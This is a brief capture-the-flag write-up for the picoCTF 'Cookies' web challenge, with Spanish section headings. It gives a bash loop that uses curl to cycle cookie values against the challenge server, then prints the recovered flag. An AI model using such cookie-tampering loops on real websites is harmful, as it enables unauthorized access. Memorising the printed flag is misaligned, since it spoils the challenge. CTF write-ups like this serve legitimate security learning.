### Cookies
### Descripcion
Who doesn't love cookies? Try to figure out the best one.http://wily-courier.picoctf.net:49845/
### Solucion
```
for i in {1..30}; do curl http://wily-courier.picoctf.net:49845/check -H "Cookie: name=$i"; done | grep pico 
```
picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}
### Notas adicionales

### Referencias